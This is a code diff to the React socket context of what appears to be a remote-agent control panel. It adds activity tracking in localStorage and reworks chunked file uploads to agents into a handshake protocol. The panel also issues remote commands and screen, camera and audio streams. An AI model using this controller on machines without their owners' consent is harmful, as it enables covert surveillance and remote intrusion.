@@ -36,6 +36,8 @@ interface SocketContextType {
   notifications: Notification[];
   selectedAgent: string | null;
   setSelectedAgent: (agentId: string | null) => void;
+  lastActivity?: { type: string; details?: string; agentId?: string | null; timestamp?: number };
+  setLastActivity: (type: string, details?: string, agentId?: string | null) => void;
   sendCommand: (agentId: string, command: string) => void;
   startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
   stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
@@ -157,6 +159,14 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [commandOutput, setCommandOutput] = useState<string[]>([]);
   const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});
   const lastEmitRef = useRef<Record<string, number>>({});
+  const [lastActivity, _setLastActivity] = useState<{ type: string; details?: string; agentId?: string | null; timestamp?: number }>(() => {
+    try {
+      const raw = localStorage.getItem('nch:lastActivity');
+      return raw ? JSON.parse(raw) : { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
+    } catch {
+      return { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
+    }
+  });
   const [agentConfig, setAgentConfig] = useState<Record<string, {
     agent?: {
       id?: string;
@@ -193,6 +203,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
 
   const clearCommandOutput = useCallback(() => {
     setCommandOutput([]);
+  }, []);
+
+  const setLastActivity = useCallback((type: string, details?: string, agentId?: string | null) => {
+    const entry = { type, details, agentId, timestamp: Date.now() };
+    _setLastActivity(entry);
+    try { localStorage.setItem('nch:lastActivity', JSON.stringify(entry)); } catch {}
   }, []);
 
   useEffect(() => {
@@ -890,6 +906,13 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       lastEmitRef.current[k] = now;
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Starting ${type} stream for ${agentId}`);
+      setLastActivity(`stream:${type}`, `started`, agentId);
+      try {
+        const key = `stream:last:${agentId}`;
+        const raw = localStorage.getItem(key);
+        const prev = raw ? JSON.parse(raw) : {};
+        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: true }));
+      } catch {}
     }
   }, [socket, connected, addCommandOutput]);
 
@@ -916,40 +939,60 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       lastEmitRef.current[k] = now;
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Stopping ${type} stream for ${agentId}`);
+      setLastActivity(`stream:${type}`, `stopped`, agentId);
+      try {
+        const key = `stream:last:${agentId}`;
+        const raw = localStorage.getItem(key);
+        const prev = raw ? JSON.parse(raw) : {};
+        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: false }));
+      } catch {}
     }
   }, [socket, connected, addCommandOutput]);
 
   const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
-    if (!socket || !connected) return;
-
+    if (!socket) return;
     const destinationDir = normalizeDestinationDir(destinationPath, file.name);
     addCommandOutput(`Uploading ${file.name} (${file.size} bytes) to ${agentId}:${destinationDir || '(default)'}`);
-
-    const chunkSize = 512 * 1024;
-
+    const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
+    const chunkSize = 256 * 1024;
+    const chunkDelayMs = 8;
     (async () => {
+      socket.emit('upload_file_start', {
+        agent_id: agentId,
+        upload_id: uploadId,
+        filename: file.name,
+        destination: destinationDir,
+        total_size: file.size,
+      });
+      await new Promise<void>((resolve) => {
+        const onReady = (data: any) => {
+          if (String(data?.upload_id || '') === uploadId || String(data?.filename || '') === file.name) {
+            socket.off('upload_ready', onReady);
+            resolve();
+          }
+        };
+        socket.on('upload_ready', onReady);
+        setTimeout(() => {
+          socket.off('upload_ready', onReady);
+          resolve();
+        }, 2000);
+      });
       for (let offset = 0; offset < file.size; offset += chunkSize) {
         const slice = file.slice(offset, offset + chunkSize);
         const buffer = await slice.arrayBuffer();
         const bytes = new Uint8Array(buffer);
         const chunkB64 = bytesToBase64(bytes);
-
         socket.emit('upload_file_chunk', {
           agent_id: agentId,
-          filename: file.name,
-          data: chunkB64,
+          upload_id: uploadId,
           chunk: chunkB64,
-          chunk_data: chunkB64,
           offset,
-          total_size: file.size,
-          destination_path: destinationDir
         });
+        await new Promise((r) => setTimeout(r, chunkDelayMs));
       }
-
-      socket.emit('upload_file_end', {
+      socket.emit('upload_file_complete', {
         agent_id: agentId,
-        filename: file.name,
-        destination_path: destinationDir
+        upload_id: uploadId,
       });
     })().catch((error) => {
       addCommandOutput(`Upload failed: ${error?.message || String(error)}`);
@@ -1015,6 +1058,16 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     setAuthenticated(false);
     clearCommandOutput();
     try {
+      const keysToRemove: string[] = [];
+      for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i) || '';
+        if (k.startsWith('fm:lastPath:') || k.startsWith('stream:last:') || k === 'nch:lastActivity') {
+          keysToRemove.push(k);
+        }
+      }
+      keysToRemove.forEach(k => localStorage.removeItem(k));
+    } catch {}
+    try {
       // Redirect to login page (server-rendered)
       window.location.href = '/login';
     } catch {}
@@ -1042,6 +1095,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     agents,
     selectedAgent,
     setSelectedAgent,
+    lastActivity,
+    setLastActivity,
     sendCommand,
     startStream,
     stopStream,
